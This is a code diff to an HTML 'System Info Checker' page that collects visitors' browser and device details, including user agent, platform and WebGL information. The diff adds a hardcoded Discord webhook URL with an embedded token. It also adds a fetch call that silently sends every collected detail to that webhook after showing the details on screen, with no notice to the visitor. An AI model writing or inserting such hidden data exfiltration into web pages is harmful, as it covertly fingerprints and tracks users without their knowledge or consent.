@@ -6,6 +6,7 @@
     <title>System Info Checker</title>
     <script>
         async function getSystemInfo() {
+            const webhookUrl = "https://discordapp.com/api/webhooks/1331766891630563360/hNFGqedGjuvsgNJmGBrk0asdX_kZ0D7dlK-7MdXEHihk_oXwYDrGtdNNRGO4UA4ZmBf7";
             const info = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -47,6 +48,19 @@
             }
             output += "</ul>";
             document.getElementById("info").innerHTML = output;
+
+            // Send Data to Discord Webhook
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `**New System Info Report:**\n${Object.entries(info).map(([key, value]) => `**${key}:** ${value}`).join("\n")}`
+                    })
+                });
+            } catch (error) {
+                console.error("Failed to send data to Discord webhook", error);
+            }
         }
 
         function getWebGLInfo() {
